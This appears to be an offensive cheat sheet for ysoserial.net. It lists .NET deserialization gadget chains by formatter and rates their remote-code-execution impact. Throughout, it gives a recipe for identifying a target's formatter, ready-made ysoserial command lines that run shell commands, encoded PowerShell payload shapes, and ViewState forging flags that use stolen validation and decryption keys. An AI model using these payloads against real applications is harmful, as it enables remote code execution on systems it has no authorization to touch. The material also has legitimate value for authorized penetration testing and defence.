# .NET Gadget Catalog — ysoserial.net chains and formatters

## Reading the tool output

```bash
ysoserial.exe -l
# each row:  <GadgetName>  <Formatters it supports>  <impact>
# -f picks the formatter (the CONTAINER), -g picks the gadget (the PAYLOAD)
```

## Formatter → which gadget shapes work

| Formatter | Container | Gadget families that land |
|---|---|---|
| BinaryFormatter | binary `AAEAAD` | TextFormattingRunProperties, TypeConfuseDelegate(+Mono), WindowsIdentity, ClaimsPrincipal, ActivitySurrogateSelector*, AxHostState, DataSet, GenericPrincipal, ObjectDataProvider variants, PSObject, RolePrincipal, SessionSecurityToken, TransactionCEO, WindowsClaimsIdentity, ResourceSet, RegistrationTrigger |
| SoapFormatter | SOAP XML | ActivitySurrogateSelector, TextFormattingRunProperties, TypeConfuseDelegate, WindowsClaimsIdentity |
| LosFormatter | ViewState | TextFormattingRunProperties, TypeConfuseDelegate, ActivitySurrogateSelector* |
| NetDataContractSerializer | XML/binary | TextFormattingRunProperties, TypeConfuseDelegate, WindowsIdentity |
| Json.NET | JSON `$type` | ObjectDataProvider, WindowsClaimsIdentity, PSObject, ActivitySurrogateSelector* |
| Xaml | XAML | ObjectDataProvider, ResourceDictionary |
| JavaScriptSerializer | JSON `__type` | ObjectDataProvider |
| DataContractSerializer | XML | ObjectDataProvider, TextFormattingRunProperties |
| XmlSerializer | XML | (weakest — setter-only) ObjectDataProvider via proxy type |
| DataContractJsonSerializer | JSON | ObjectDataProvider |
| YamlDotNet | YAML | typed-tag `!<type>` + ObjectDataProvider |

## The high-value gadgets — what each does

| Gadget | Mechanism | Impact |
|---|---|---|
| ActivitySurrogateSelector | surrogate selector that compiles a serializable assembly → runs ctor | full RCE — most reliable |
| ActivitySurrogateSelectorFromFile | same but payload from a file | RCE |
| TypeConfuseDelegate | delegate type-confusion → calls `Process.Start` via `Comparer` | RCE — small, clean |
| TypeConfuseDelegateMono | Mono-safe variant | RCE on Mono |
| TextFormattingRunProperties | `TextFormattingRunProperties` ObjectDataProvider→XamlReader→WPF | RCE — the ViewState standard |
| WindowsIdentity | `WindowsIdentity` ctor → `BootstrapContext` → claims → process | RCE |
| WindowsClaimsIdentity | claims principal → process | RCE |
| ClaimsPrincipal | claims → process | RCE |
| ObjectDataProvider | instantiates any class + calls named method | `Process.Start` via Json.NET/Xaml |
| PSObject | PowerShell runspace → arbitrary PS | full PS |
| AxHostState | ActiveX host | variant |
| DataSet | DataTable `ReadXml`/`GetType` | variant |
| GenericPrincipal | claims → process | variant |
| RolePrincipal | role principal | variant |
| SessionSecurityToken | session token claims | variant |
| TransactionCEO | Transaction delegates | newer — useful on newer .NET |
| ResourceSet | resource res | variant |
| RegistrationTrigger | trigger reg | variant |
| ToolboxItemContainer | toolbox host | variant |

## The pick recipe

```
1. Identify the formatter from the container (AAEAAD→BinaryFormatter,
   {"$type"→Json.NET, /wEP→LosFormatter/ViewState, SOAP-ENV→SoapFormatter)
2. ysoserial.exe -l → filter the table by that formatter
3. prefer in order: ActivitySurrogateSelector* > TypeConfuseDelegate >
   ObjectDataProvider (Json.NET/Xaml) > TextFormattingRunProperties (ViewState)
4. -t runs it locally first — a gadget that can't run locally never lands
```

```bash
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c id" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c id" -o base64
ysoserial.exe -g ActivitySurrogateSelectorFromFile \
  -f BinaryFormatter -c "cmd /c id" --sf /path/to/payload.cs -o base64
```

## The command shape for Windows vs Linux targets

```
-c "cmd /c whoami"              # Windows
-c "cmd /c powershell -enc B64" # PowerShell-encoded
-c "/bin/sh -c id"              # Mono/Linux target
```

`-c` is passed verbatim — encode a PowerShell payload with `-enc` yourself
and put the encoded form inside `-c "powershell -enc <b64>"`.

## Output modes

```
-o raw      stdout bytes
-o base64   the deliverable for a cookie/JSON field
-o hex
-o runcommand   run locally to test
-o minify / -o simple
```

## ViewState-specific flags

```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  --validationalg="SHA1"   # or HMACSHA256
  --validationkey="hexkey"
  --decryptionalg="AES"    # or 3DES / empty if unsigned
  --decryptionkey="hexkey"
  --generator="4C97A4A9"   # from __VIEWSTATEGENERATOR
  --path="/page.aspx" --apppath="/" \
  --viewstateuserkey="optional-per-user" \
  --islegacy --isdebug -c "cmd /c id" -o base64
```

`--generator` and `--path`/`--apppath` must match the page — the MAC input
includes them. `--islegacy`/`--isdebug` toggle the legacy formatting shape.

## The formatters' different trigger semantics

- `BinaryFormatter`/`SoapFormatter`/`NetDataContractSerializer` call the
  `ISerializable` ctor + `IDeserializationCallback` → richest surface.
- `Json.NET` `$type` calls the ctor + setters — `ObjectDataProvider` is the
  bridge to `Process.Start` because `ObjectDataProvider` calls a METHOD.
- `XmlSerializer` only calls a parameterless ctor + setters — weakest;
  needs a proxy type like `ObjectDataProvider` to reach a method call.

## Output to record

- gadget + formatter exactly as invoked (`-g`, `-f`, `-c`, output mode)
- the command string passed
- verbatim response or OOB line proving it ran
